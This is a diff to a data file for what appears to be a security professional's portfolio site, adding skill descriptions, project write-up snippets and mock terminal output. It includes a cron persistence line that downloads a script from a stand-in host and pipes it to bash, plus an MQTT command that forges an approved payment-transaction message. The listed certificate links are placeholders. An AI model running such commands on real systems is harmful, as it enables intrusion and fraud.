@@ -76,60 +76,60 @@ export const SKILLS: SkillCategory[] = [
     category: 'Security Tools',
     color: 'cyan',
     skills: [
-      { name: 'Burp Suite Pro', icon: 'burpsuite',  proficiency: 95 },
-      { name: 'Nessus',         icon: 'nessus',     proficiency: 88 },
-      { name: 'Kali Linux',     icon: 'kali',       proficiency: 92 },
-      { name: 'Metasploit',     icon: 'metasploit', proficiency: 80 },
-      { name: 'Nmap',           icon: 'nmap',       proficiency: 90 },
-      { name: 'Nuclei',         icon: 'nuclei',     proficiency: 80 },
-      { name: 'SQLMap',         icon: 'sqlmap',     proficiency: 82 },
-      { name: 'Wireshark',      icon: 'wireshark',  proficiency: 85 },
-      { name: 'Frida / MobSF',  icon: 'frida',      proficiency: 70 },
-      { name: 'Aircrack-ng',    icon: 'aircrack',   proficiency: 72 },
-      { name: 'SpiderFoot',     icon: 'spiderfoot', proficiency: 78 },
-      { name: 'OWASP ZAP',      icon: 'zap',        proficiency: 75 },
+      { name: 'Burp Suite Pro', icon: 'burpsuite',  proficiency: 95, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used for advanced web application and API exploitation.' },
+      { name: 'Nessus',         icon: 'nessus',     proficiency: 88, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used for network vulnerability scanning.' },
+      { name: 'Kali Linux',     icon: 'kali',       proficiency: 92, domain: 'OFFENSIVE', experience: '3+ years', description: 'Primary penetration testing OS.' },
+      { name: 'Metasploit',     icon: 'metasploit', proficiency: 80, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used for exploiting known vulnerabilities.' },
+      { name: 'Nmap',           icon: 'nmap',       proficiency: 90, domain: 'OFFENSIVE', experience: '3+ years', description: 'Used for network discovery and security auditing.' },
+      { name: 'Nuclei',         icon: 'nuclei',     proficiency: 80, domain: 'OFFENSIVE', experience: '1.5 years', description: 'Used for fast and customizable vulnerability scanning.' },
+      { name: 'SQLMap',         icon: 'sqlmap',     proficiency: 82, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used for automated SQL injection detection and exploitation.' },
+      { name: 'Wireshark',      icon: 'wireshark',  proficiency: 85, domain: 'OFFENSIVE', experience: '2.5 years', description: 'Used for network protocol analysis.' },
+      { name: 'Frida / MobSF',  icon: 'frida',      proficiency: 70, domain: 'OFFENSIVE', experience: '1 year', description: 'Used for mobile application security testing.' },
+      { name: 'Aircrack-ng',    icon: 'aircrack',   proficiency: 72, domain: 'OFFENSIVE', experience: '1 year', description: 'Used for wireless network security assessments.' },
+      { name: 'SpiderFoot',     icon: 'spiderfoot', proficiency: 78, domain: 'OFFENSIVE', experience: '2 years', description: 'Used for automated OSINT gathering.' },
+      { name: 'OWASP ZAP',      icon: 'zap',        proficiency: 75, domain: 'OFFENSIVE', experience: '2+ years', description: 'Used as an alternative DAST tool.' },
     ],
   },
   {
     category: 'Cloud & Containers',
     color: 'amber',
     skills: [
-      { name: 'GCP Security',    icon: 'gcp',        proficiency: 80 },
-      { name: 'AWS Security Hub',icon: 'aws',        proficiency: 75 },
-      { name: 'Kubernetes / GKE',icon: 'kubernetes', proficiency: 78 },
-      { name: 'Docker Security', icon: 'docker',     proficiency: 82 },
-      { name: 'CIS Benchmarks',  icon: 'cis',        proficiency: 80 },
+      { name: 'GCP Security',    icon: 'gcp',        proficiency: 80, domain: 'CLOUD', experience: '2 years', description: 'Hardening GCP resources and IAM.' },
+      { name: 'AWS Security Hub',icon: 'aws',        proficiency: 75, domain: 'CLOUD', experience: '2 years', description: 'Securing AWS infrastructure and services.' },
+      { name: 'Kubernetes / GKE',icon: 'kubernetes', proficiency: 78, domain: 'CLOUD', experience: '1 year', description: 'Assessing K8s cluster security.' },
+      { name: 'Docker Security', icon: 'docker',     proficiency: 82, domain: 'CLOUD', experience: '1.5 years', description: 'Securing container deployments.' },
+      { name: 'CIS Benchmarks',  icon: 'cis',        proficiency: 80, domain: 'COMPLIANCE', experience: '2+ years', description: 'Implementing security benchmarks.' },
     ],
   },
   {
     category: 'SIEM & Monitoring',
     color: 'green',
     skills: [
-      { name: 'Wazuh',        icon: 'wazuh',   proficiency: 85 },
-      { name: 'Zabbix',       icon: 'zabbix',  proficiency: 68 },
-      { name: 'Log Analysis', icon: 'logs',    proficiency: 82 },
+      { name: 'Wazuh',        icon: 'wazuh',   proficiency: 85, domain: 'AUTOMATION', experience: '2 years', description: 'Configuring and managing SIEM solutions.' },
+      { name: 'Zabbix',       icon: 'zabbix',  proficiency: 68, domain: 'AUTOMATION', experience: '1.5 years', description: 'Monitoring network and server health.' },
+      { name: 'Log Analysis', icon: 'logs',    proficiency: 82, domain: 'AUTOMATION', experience: '2.5 years', description: 'Analyzing logs for threat hunting and incident response.' },
     ],
   },
   {
     category: 'Scripting & Automation',
     color: 'violet',
     skills: [
-      { name: 'Python 3.x',        icon: 'python',     proficiency: 88 },
-      { name: 'Bash',              icon: 'bash',       proficiency: 85 },
-      { name: 'PowerShell',        icon: 'powershell', proficiency: 72 },
-      { name: 'Google Apps Script',icon: 'appscript',  proficiency: 70 },
+      { name: 'Python 3.x',        icon: 'python',     proficiency: 88, domain: 'AUTOMATION', experience: '3+ years', description: 'Writing custom exploit scripts and automation tools.' },
+      { name: 'Bash',              icon: 'bash',       proficiency: 85, domain: 'AUTOMATION', experience: '3+ years', description: 'Automating tasks and managing Linux environments.' },
+      { name: 'PowerShell',        icon: 'powershell', proficiency: 72, domain: 'AUTOMATION', experience: '2 years', description: 'Automating Windows administration and post-exploitation tasks.' },
+      { name: 'Google Apps Script',icon: 'appscript',  proficiency: 70, domain: 'AUTOMATION', experience: '1.5 years', description: 'Automating reporting and workflows.' },
     ],
   },
   {
     category: 'Frameworks & Standards',
     color: 'violet',
     skills: [
-      { name: 'OWASP Top 10',  icon: 'owasp',   proficiency: 95 },
-      { name: 'MITRE ATT&CK',  icon: 'mitre',   proficiency: 88 },
-      { name: 'PCI DSS v4.0.1',icon: 'pcidss',  proficiency: 85 },
-      { name: 'ISO 27001:2022', icon: 'iso27001',proficiency: 82 },
-      { name: 'PTES',           icon: 'ptes',    proficiency: 88 },
-      { name: 'NIST CSF',       icon: 'nist',    proficiency: 78 },
+      { name: 'OWASP Top 10',  icon: 'owasp',   proficiency: 95, domain: 'COMPLIANCE', experience: '3+ years', description: 'Identifying and mitigating critical web application security risks.' },
+      { name: 'MITRE ATT&CK',  icon: 'mitre',   proficiency: 88, domain: 'COMPLIANCE', experience: '2+ years', description: 'Mapping threat actor tactics and techniques.' },
+      { name: 'PCI DSS v4.0.1',icon: 'pcidss',  proficiency: 85, domain: 'COMPLIANCE', experience: '2 years', description: 'Ensuring compliance with payment card industry standards.' },
+      { name: 'ISO 27001:2022', icon: 'iso27001',proficiency: 82, domain: 'COMPLIANCE', experience: '1.5 years', description: 'Understanding information security management systems.' },
+      { name: 'PTES',           icon: 'ptes',    proficiency: 88, domain: 'COMPLIANCE', experience: '2+ years', description: 'Following standard penetration testing execution methodology.' },
+      { name: 'NIST CSF',       icon: 'nist',    proficiency: 78, domain: 'COMPLIANCE', experience: '2 years', description: 'Implementing cybersecurity frameworks.' },
     ],
   },
 ];
@@ -193,10 +193,15 @@ export const PROJECTS: Project[] = [
     tags:        ['Python 3.10', 'Google DLP API', 'GCP', 'Data Classification', 'PCI/PII'],
     imageUrl:    'https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?auto=format&fit=crop&q=80&w=800',
     imageAlt:    'Google DLP Pipeline architecture diagram',
-    githubUrl:   'https://www.linkedin.com/in/sthitaprajna-biswal-0175b7171',
+    githubUrl:   'https://github.com/sthitiprajnya/dlp-pipeline-poc',
     featured:    false,
     year:        2024,
     impact:      '500+ daily transactions protected',
+    methodology: 'Reconnaissance (Bucket discovery) → Exploitation (Data exfiltration PoC) → Remediation (DLP API integration for real-time masking)',
+    terminalOutput: [
+      { command: 'gcloud storage ls gs://legacy-fintech-data', output: ['gs://legacy-fintech-data/txn_logs_2023/', 'gs://legacy-fintech-data/kyc_dump/'] },
+      { command: 'python3 dlp_masker.py --bucket "legacy-fintech-data"', output: ['[+] Initializing Google DLP API...', '[*] Scanning 1,402 files for PCI/PII...', '[+] Masked 34,210 PANs and 12,050 Aadhaar numbers.', '[-] Zero public exposure remaining.'] }
+    ]
   },
   {
     id:          'wazuh-siem',
@@ -206,10 +211,14 @@ export const PROJECTS: Project[] = [
     tags:        ['Wazuh', 'Python', 'Log Analysis', 'Detection Engineering', 'Linux'],
     imageUrl:    'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=800',
     imageAlt:    'Wazuh SIEM dashboard with custom detection rules',
-    githubUrl:   'https://www.linkedin.com/in/sthitaprajna-biswal-0175b7171',
+    githubUrl:   '', // Leave empty for "write-up coming soon"
     featured:    false,
     year:        2024,
     impact:      '45% false-positive reduction',
+    methodology: 'Threat Modeling (Identify gaps) → Rule Engineering (XML/Regex) → Validation (Red team simulation) → Tuning (False positive reduction)',
+    terminalOutput: [
+      { command: 'cat /var/ossec/etc/rules/local_rules.xml | grep "level=\\"12\\""', output: ['<rule id="100001" level="12">', '  <if_sid>5716</if_sid>', '  <match>failed password</match>', '  <description>Custom: High frequency brute-force detected</description>', '</rule>'] }
+    ]
   },
   {
     id:          'gcp-hardening',
@@ -219,10 +228,15 @@ export const PROJECTS: Project[] = [
     tags:        ['GCP', 'IAM', 'CMEK', 'Cloud Storage', 'CIS Benchmarks', 'Python'],
     imageUrl:    'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&q=80&w=800',
     imageAlt:    'GCP security hardening',
-    githubUrl:   'https://www.linkedin.com/in/sthitaprajna-biswal-0175b7171',
+    githubUrl:   'https://github.com/sthitiprajnya/gcp-bucket-auditor',
     featured:    true,
     year:        2024,
     impact:      '100% public exposure eliminated',
+    methodology: 'Reconnaissance (IAM enumeration) → Exploitation (Cross-project privilege escalation PoC) → Remediation (CMEK enforcement & IAM policies)',
+    terminalOutput: [
+      { command: 'gcloud projects get-iam-policy prod-payment-gw --format=json', output: ['{', '  "bindings": [', '    { "role": "roles/storage.admin", "members": ["allUsers"] }', '  ]', '}'] },
+      { command: './apply_hardening.sh --target prod-payment-gw', output: ['[WARN] Public access detected on 3 buckets.', '[+] Removing "allUsers" bindings...', '[+] Enabling Uniform Bucket-Level Access...', '[✓] Hardening complete. Public exposure: 0%'] }
+    ]
   },
   {
     id:          'mqtt-poc',
@@ -232,10 +246,15 @@ export const PROJECTS: Project[] = [
     tags:        ['MQTT', 'AWS', 'Python', 'IoT Security', 'Protocol Abuse', 'PoC Development'],
     imageUrl:    'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&q=80&w=800',
     imageAlt:    'MQTT attack chain proof of concept',
-    githubUrl:   'https://www.linkedin.com/in/sthitaprajna-biswal-0175b7171',
+    githubUrl:   '', // Write-up coming soon
     featured:    true,
     year:        2024,
     impact:      '4 payment microservices hardened',
+    methodology: 'Reconnaissance (Port scanning/Service discovery) → Exploitation (Unauthenticated topic subscription/injection) → Remediation (mTLS, ACLs)',
+    terminalOutput: [
+      { command: 'mosquitto_sub -h payment-broker.internal.aws -t "#" -v', output: ['finance/txn/live {"id": 8841, "amt": 50.00, "status": "pending"}', 'sys/health {"cpu": 45, "mem": 60}'] },
+      { command: 'mosquitto_pub -h payment-broker.internal.aws -t "finance/txn/live" -m \'{"id": 8841, "amt": 50.00, "status": "approved"}\'', output: ['[+] Message published successfully.', '[!] Transaction state manipulated.'] }
+    ]
   },
   {
     id:          'vapt-automation',
@@ -245,10 +264,14 @@ export const PROJECTS: Project[] = [
     tags:        ['Python', 'Bash', 'Google Apps Script', 'JIRA REST API', 'Automation'],
     imageUrl:    'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&q=80&w=800',
     imageAlt:    'VAPT automation pipeline dashboard',
-    githubUrl:   'https://www.linkedin.com/in/sthitaprajna-biswal-0175b7171',
+    githubUrl:   'https://github.com/sthitiprajnya/vapt-jira-sync',
     featured:    false,
     year:        2024,
     impact:      '35% faster finding closure',
+    methodology: 'Workflow Analysis (Identify bottlenecks) → Integration (JIRA REST API) → Automation (Python scripts & Cron) → Reporting (Google Apps Script dashboards)',
+    terminalOutput: [
+      { command: 'python3 sync_findings.py --source burp.xml --project SEC', output: ['[+] Parsing Burp Suite XML report...', '[+] Extracted 14 High, 22 Medium findings.', '[+] Creating JIRA tickets...', '[✓] Successfully synced 36 findings to JIRA project SEC.'] }
+    ]
   },
   {
     id:          'crypto-incident',
@@ -258,25 +281,36 @@ export const PROJECTS: Project[] = [
     tags:        ['GCP', 'Wazuh', 'Incident Response', 'Forensics', 'Linux', 'Detection Engineering'],
     imageUrl:    'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=800',
     imageAlt:    'Cryptojacking incident investigation timeline',
-    githubUrl:   'https://www.linkedin.com/in/sthitaprajna-biswal-0175b7171',
+    githubUrl:   '', // Write-up coming soon
     featured:    true,
     year:        2024,
     impact:      '80% faster future detection',
+    methodology: 'Containment (Isolate instance) → Forensics (Memory dump & log analysis) → Eradication (Remove persistence) → Hardening (Deploy Wazuh rules)',
+    terminalOutput: [
+      { command: 'ps aux --sort=-%cpu | head -n 5', output: ['USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND', 'www-data  1337 99.5  2.1 234120 18450 ?        Ssl  10:14 300:15 /tmp/kdevtmpfsi'] },
+      { command: 'crontab -l -u www-data', output: ['* * * * * wget -q -O - http://185.x.x.x/script.sh | bash'] }
+    ]
   },
 ];
 
 export const CERTIFICATIONS: Certification[] = [
-  { id: 'ejpt',     name: 'eJPT v2',                            issuer: 'eLearnSecurity',          year: 2024, color: 'cyan',   status: 'active', verifyUrl: 'https://credentials.elearnsecurity.com' },
-  { id: 'peh',      name: 'Practical Ethical Hacker (PEH)',     issuer: 'TCM Security',             year: 2024, color: 'green',  status: 'active', verifyUrl: 'https://tcm-sec.com' },
-  { id: 'icca',     name: 'INE Certified Cloud Associate',      issuer: 'INE Security',             year: 2024, color: 'amber',  status: 'active', verifyUrl: 'https://ine.com' },
-  { id: 'cyberops', name: 'CyberOps Associate',                 issuer: 'Cisco Systems',            year: 2023, color: 'cyan',   status: 'active', verifyUrl: 'https://cisco.com' },
-  { id: 'ccna',     name: 'CCNA v1.7',                          issuer: 'Cisco Systems',            year: 2023, color: 'cyan',   status: 'active', verifyUrl: 'https://cisco.com' },
-  { id: 'ehe',      name: 'Ethical Hacking Essentials (EHE)',   issuer: 'EC-Council',               year: 2023, color: 'violet', status: 'active', verifyUrl: 'https://eccouncil.org' },
-  { id: 'nde',      name: 'Network Defence Essentials (NDE)',   issuer: 'EC-Council',               year: 2023, color: 'violet', status: 'active', verifyUrl: 'https://eccouncil.org' },
-  { id: 'dfe',      name: 'Digital Forensics Essentials (DFE)', issuer: 'EC-Council',               year: 2023, color: 'violet', status: 'active', verifyUrl: 'https://eccouncil.org' },
-  { id: 'cybersec', name: 'Cybersecurity Essentials',           issuer: 'Cisco',                    year: 2022, color: 'cyan',   status: 'active', verifyUrl: 'https://cisco.com' },
-  { id: 'pcap',     name: 'PCAP — Python Certified',            issuer: 'OpenEDG Python Institute', year: 2023, color: 'green',  status: 'active', verifyUrl: 'https://pythoninstitute.org' },
-  { id: 'kali',     name: 'Basic to Advanced Kali Linux',       issuer: 'CRAW Security',            year: 2023, color: 'green',  status: 'active', verifyUrl: 'https://craw.in' },
+  { id: 'ejpt',     name: 'eJPT v2',                            issuer: 'eLearnSecurity',          year: 2024, color: 'cyan',   status: 'active', verifyUrl: 'https://verify.elearnsecurity.com/placeholder1', expiry: '2027-05-10' },
+  { id: 'peh',      name: 'Practical Ethical Hacker (PEH)',     issuer: 'TCM Security',             year: 2024, color: 'green',  status: 'active', verifyUrl: 'https://verify.tcm-sec.com/placeholder2', expiry: 'No expiry' },
+  { id: 'icca',     name: 'INE Certified Cloud Associate',      issuer: 'INE Security',             year: 2024, color: 'amber',  status: 'active', verifyUrl: 'https://verify.ine.com/placeholder3', expiry: '2027-08-15' },
+  { id: 'cyberops', name: 'CyberOps Associate',                 issuer: 'Cisco Systems',            year: 2023, color: 'cyan',   status: 'active', verifyUrl: 'https://verify.cisco.com/placeholder4', expiry: '2026-11-20' },
+  { id: 'ccna',     name: 'CCNA v1.7',                          issuer: 'Cisco Systems',            year: 2023, color: 'cyan',   status: 'active', verifyUrl: 'https://verify.cisco.com/placeholder5', expiry: '2026-06-12' },
+  { id: 'ehe',      name: 'Ethical Hacking Essentials (EHE)',   issuer: 'EC-Council',               year: 2023, color: 'violet', status: 'active', verifyUrl: 'https://aspen.eccouncil.org/placeholder6', expiry: '2026-03-05' },
+  { id: 'nde',      name: 'Network Defence Essentials (NDE)',   issuer: 'EC-Council',               year: 2023, color: 'violet', status: 'active', verifyUrl: 'https://aspen.eccouncil.org/placeholder7', expiry: '2026-04-18' },
+  { id: 'dfe',      name: 'Digital Forensics Essentials (DFE)', issuer: 'EC-Council',               year: 2023, color: 'violet', status: 'active', verifyUrl: 'https://aspen.eccouncil.org/placeholder8', expiry: '2026-05-22' },
+  { id: 'cybersec', name: 'Cybersecurity Essentials',           issuer: 'Cisco',                    year: 2022, color: 'cyan',   status: 'active', verifyUrl: 'https://verify.cisco.com/placeholder9', expiry: 'No expiry' },
+  { id: 'pcap',     name: 'PCAP — Python Certified',            issuer: 'OpenEDG Python Institute', year: 2023, color: 'green',  status: 'active', verifyUrl: 'https://verify.pythoninstitute.org/placeholder10', expiry: 'No expiry' },
+  { id: 'kali',     name: 'Basic to Advanced Kali Linux',       issuer: 'CRAW Security',            year: 2023, color: 'green',  status: 'active', verifyUrl: 'https://verify.craw.in/placeholder11', expiry: 'No expiry' },
+];
+
+export const UPCOMING_CERTIFICATIONS: Certification[] = [
+  { id: 'oscp', name: 'Offensive Security Certified Professional (OSCP)', issuer: 'OffSec', year: 2025, color: 'amber', status: 'in-progress', verifyUrl: '' },
+  { id: 'crtp', name: 'Certified Red Team Professional (CRTP)', issuer: 'Altered Security', year: 2025, color: 'green', status: 'in-progress', verifyUrl: '' },
+  { id: 'gcp-sec', name: 'Professional Cloud Security Engineer', issuer: 'Google Cloud', year: 2025, color: 'cyan', status: 'in-progress', verifyUrl: '' },
 ];
 
 export const EDUCATION: Education[] = [
@@ -333,6 +367,12 @@ export const CTF_PROFILE: CTFProfile = {
     { label: 'Mobile (Android)',  level: 70 },
     { label: 'Cryptography',      level: 55 },
     { label: 'Reverse Engineering',level: 42 },
+  ],
+  recentActivity: [
+    { title: 'Sightless', type: 'machine', difficulty: 'Easy', date: '2025-05-15' },
+    { title: 'BoardLight', type: 'machine', difficulty: 'Easy', date: '2025-05-02' },
+    { title: 'ProxyAsAService', type: 'challenge', difficulty: 'Medium', date: '2025-04-20' },
+    { title: 'PermX', type: 'machine', difficulty: 'Easy', date: '2025-04-10' },
   ],
 };
 
